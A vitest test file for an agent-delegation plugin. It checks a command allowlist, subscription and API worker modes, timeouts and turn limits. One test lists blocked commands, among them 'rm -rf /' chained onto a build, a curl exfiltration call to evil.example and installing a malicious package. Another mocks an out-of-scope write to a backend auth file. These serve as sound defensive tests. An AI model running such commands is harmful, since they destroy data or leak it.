import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  getArtifactsDir,
  readManifest,
  writeManifest,
  writeReportMarkdown,
} from '../src/bridge-fs.js';
import {
  ApiWorkerEngine,
  ModelTurnResponse,
  validateCommandPolicy,
} from '../src/engines/api-worker.js';
import { SubscriptionEngine } from '../src/engines/subscription.js';
import {
  handleCheckEnvironment,
  handleDelegateToAntigravity,
} from '../src/index.js';
import { AgPluginError } from '../src/types.js';

describe('engines & MCP pipeline (TC-S04, TC-I02 ~ TC-I05)', () => {
  let tmpRoot: string;
  const pluginRoot = path.resolve(import.meta.dirname, '..', '..');

  beforeEach(() => {
    tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'ag-engine-'));
    fs.mkdirSync(path.join(tmpRoot, 'src', 'ui'), { recursive: true });
    fs.mkdirSync(path.join(tmpRoot, 'src', 'backend'), { recursive: true });
    fs.writeFileSync(path.join(tmpRoot, 'package.json'), JSON.stringify({ name: 'demo', scripts: { build: 'tsc' } }));
  });

  afterEach(() => {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  });

  it('TC-S04: enforces strict command allowlist and blocks shell chaining / dangerous commands', () => {
    expect(validateCommandPolicy('npx tsc --noEmit')).toEqual({
      bin: 'npx',
      args: ['tsc', '--noEmit'],
    });
    expect(validateCommandPolicy('npm run build')).toEqual({
      bin: 'npm',
      args: ['run', 'build'],
    });

    const blocked = [
      'npm run build && rm -rf /',
      'npx tsc --noEmit; echo pwned',
      'curl https://evil.example/exfil',
      'git push --force',
      'rm -rf src',
      'powershell -Command Get-Process',
      'npm install malicious-pkg',
    ];

    for (const cmd of blocked) {
      expect(() => validateCommandPolicy(cmd)).toThrow(AgPluginError);
    }
  });

  it('TC-I02: runs Subscription mode end-to-end dispatch -> RUNNING -> report + artifacts -> VERIFIED', async () => {
    const subEngine = new SubscriptionEngine({
      triggerFn: async (ctx) => {
        setTimeout(() => {
          const cur = readManifest(ctx.workspaceRoot);
          if (!cur) return;
          writeManifest(ctx.workspaceRoot, {
            ...cur,
            status: 'RUNNING',
            updatedAt: new Date().toISOString(),
          });
        }, 80);

        setTimeout(() => {
          const cur = readManifest(ctx.workspaceRoot);
          if (!cur) return;
          const artDir = getArtifactsDir(ctx.workspaceRoot, cur.taskId);
          fs.mkdirSync(artDir, { recursive: true });
          fs.writeFileSync(path.join(artDir, 'dashboard.png'), 'PNGDATA');
          fs.writeFileSync(path.join(ctx.workspaceRoot, 'src', 'ui', 'Card.tsx'), 'export const Card = () => null;');
          writeReportMarkdown(
            ctx.workspaceRoot,
            '# Antigravity Task Report\n\n- **Status:** VERIFIED\n- Implemented Card component.\n',
          );
          writeManifest(ctx.workspaceRoot, {
            ...cur,
            status: 'VERIFIED',
            changedFiles: ['src/ui/Card.tsx'],
            artifacts: [`artifacts/${cur.taskId}/dashboard.png`],
            updatedAt: new Date().toISOString(),
          });
        }, 200);

        return { methodUsed: 'custom' };
      },
    });

    const res = await handleDelegateToAntigravity(
      {
        title: 'Create Card component',
        instructions: 'Implement src/ui/Card.tsx and verify visually.',
        lockedPaths: ['src/ui/'],
        verifyUrl: 'http://localhost:3000/dashboard',
        acceptanceCriteria: ['Card renders with 0 console errors'],
        modeOverride: 'subscription',
        workspaceRoot: tmpRoot,
      },
      {
        pluginRoot,
        subscriptionEngine: subEngine,
        detectorDeps: {
          platform: 'linux',
          env: {},
          homedir: '/home/tester',
          existsSync: () => false,
          findBinary: (name) => (name === 'agy' ? '/usr/local/bin/agy' : undefined),
        },
      },
    );

    expect(res.ok).toBe(true);
    expect(res.mode).toBe('subscription');
    expect(res.status).toBe('VERIFIED');
    expect(res.changedFiles).toContain('src/ui/Card.tsx');
    expect(res.artifacts.some((a) => a.endsWith('dashboard.png'))).toBe(true);
    expect(res.reportMarkdown).toContain('Implemented Card component');
  });

  it('TC-I03: times out cleanly in Subscription mode and transitions manifest to FAILED(TASK_TIMEOUT)', async () => {
    fs.mkdirSync(path.join(tmpRoot, '.ag-bridge'), { recursive: true });
    fs.writeFileSync(
      path.join(tmpRoot, '.ag-bridge', 'config.json'),
      JSON.stringify({ subscription: { timeout_sec: 1, poll_interval_ms: 150 } }),
    );

    const subEngine = new SubscriptionEngine({
      triggerFn: async () => ({ methodUsed: 'custom' }),
    });

    const res = await handleDelegateToAntigravity(
      {
        title: 'Timeout scenario',
        instructions: 'Wait until timeout triggers.',
        lockedPaths: ['src/ui/'],
        acceptanceCriteria: ['Should time out cleanly'],
        modeOverride: 'subscription',
        workspaceRoot: tmpRoot,
      },
      {
        pluginRoot,
        subscriptionEngine: subEngine,
        detectorDeps: {
          platform: 'linux',
          env: {},
          homedir: '/home/tester',
          existsSync: () => false,
          findBinary: (name) => (name === 'agy' ? '/usr/local/bin/agy' : undefined),
        },
      },
    );

    expect(res.ok).toBe(false);
    expect(res.status).toBe('FAILED');
    expect(res.errorCode).toBe('TASK_TIMEOUT');
    expect(readManifest(tmpRoot)?.status).toBe('FAILED');
  });

  it('TC-I04: runs API Worker 5-turn mock Gemini loop, blocks out-of-scope write, and writes report.md', async () => {
    const turns: ModelTurnResponse[] = [
      { functionCalls: [{ name: 'list_dir', args: { path: 'src' } }] },
      {
        functionCalls: [
          {
            name: 'write_file',
            args: { path: 'src/ui/Header.tsx', content: 'export const Header = () => "<header/>";\n' },
          },
        ],
      },
      {
        // Out-of-scope write attempt — must be blocked gracefully
        functionCalls: [
          {
            name: 'write_file',
            args: { path: 'src/backend/auth.ts', content: 'export const hacked = true;\n' },
          },
        ],
      },
      {
        functionCalls: [{ name: 'run_command', args: { command: 'npx tsc --noEmit' } }],
      },
      {
        text: 'Implemented Header component inside src/ui/Header.tsx and verified TypeScript compilation.',
      },
    ];

    let turnIdx = 0;
    const apiEngine = new ApiWorkerEngine({
      retryBaseDelayMs: 1,
      adapterFactory: () => ({
        generateTurn: async () => turns[turnIdx++] ?? { text: 'Done' },
      }),
      commandRunner: async () => ({
        exitCode: 0,
        stdout: '0 errors',
        stderr: '',
        timedOut: false,
      }),
    });

    const prevKey = process.env.GEMINI_API_KEY;
    process.env.GEMINI_API_KEY = 'AIzaSyTestMockApiKey1234567890abcdef';
    try {
      const res = await handleDelegateToAntigravity(
        {
          title: 'Build Header component',
          instructions: 'Create src/ui/Header.tsx and verify tsc.',
          lockedPaths: ['src/ui/'],
          acceptanceCriteria: ['Header exported', 'npx tsc --noEmit passes'],
          modeOverride: 'api',
          workspaceRoot: tmpRoot,
        },
        {
          pluginRoot,
          apiWorkerEngine: apiEngine,
          detectorDeps: {
            platform: 'linux',
            env: { GEMINI_API_KEY: 'AIzaSyTestMockApiKey1234567890abcdef' },
            homedir: '/home/tester',
            existsSync: () => false,
            findBinary: () => undefined,
          },
        },
      );

      expect(res.ok).toBe(true);
      expect(res.mode).toBe('api');
      expect(res.status).toBe('VERIFIED');
      expect(fs.existsSync(path.join(tmpRoot, 'src', 'ui', 'Header.tsx'))).toBe(true);
      expect(fs.existsSync(path.join(tmpRoot, 'src', 'backend', 'auth.ts'))).toBe(false);
      expect(res.reportMarkdown).toContain('Blocked 1 out-of-scope write attempt');
      expect(res.reportMarkdown).not.toContain('AIzaSyTestMockApiKey');
    } finally {
      if (prevKey === undefined) delete process.env.GEMINI_API_KEY;
      else process.env.GEMINI_API_KEY = prevKey;
    }
  });

  it('TC-I05: stops cleanly with MAX_TURNS_EXCEEDED when model keeps issuing tool calls', async () => {
    fs.mkdirSync(path.join(tmpRoot, '.ag-bridge'), { recursive: true });
    fs.writeFileSync(
      path.join(tmpRoot, '.ag-bridge', 'config.json'),
      JSON.stringify({ api: { max_turns: 3 } }),
    );

    const apiEngine = new ApiWorkerEngine({
      retryBaseDelayMs: 1,
      adapterFactory: () => ({
        generateTurn: async () => ({
          functionCalls: [{ name: 'list_dir', args: { path: '.' } }],
        }),
      }),
    });

    const prevKey = process.env.GEMINI_API_KEY;
    process.env.GEMINI_API_KEY = 'AIzaSyTestMockApiKey1234567890abcdef';
    try {
      const res = await handleDelegateToAntigravity(
        {
          title: 'Infinite loop guard test',
          instructions: 'Test max_turns enforcement.',
          lockedPaths: ['src/ui/'],
          acceptanceCriteria: ['Terminates safely at max_turns'],
          modeOverride: 'api',
          workspaceRoot: tmpRoot,
        },
        {
          pluginRoot,
          apiWorkerEngine: apiEngine,
          detectorDeps: {
            platform: 'linux',
            env: { GEMINI_API_KEY: 'AIzaSyTestMockApiKey1234567890abcdef' },
            homedir: '/home/tester',
            existsSync: () => false,
            findBinary: () => undefined,
          },
        },
      );

      expect(res.ok).toBe(false);
      expect(res.status).toBe('FAILED');
      expect(res.errorCode).toBe('MAX_TURNS_EXCEEDED');
    } finally {
      if (prevKey === undefined) delete process.env.GEMINI_API_KEY;
      else process.env.GEMINI_API_KEY = prevKey;
    }
  });

  it('check_ag_environment returns structured bridge and git status', async () => {
    const envRes = await handleCheckEnvironment(tmpRoot, {
      detectorDeps: {
        platform: 'linux',
        env: {},
        homedir: '/home/tester',
        existsSync: () => false,
        findBinary: () => undefined,
      },
    });
    expect(envRes.resolvedMode).toBe('unavailable');
    expect(envRes.bridge.currentStatus).toBe('IDLE');
    expect(envRes.git.isGitRepo).toBe(false);
  });
});
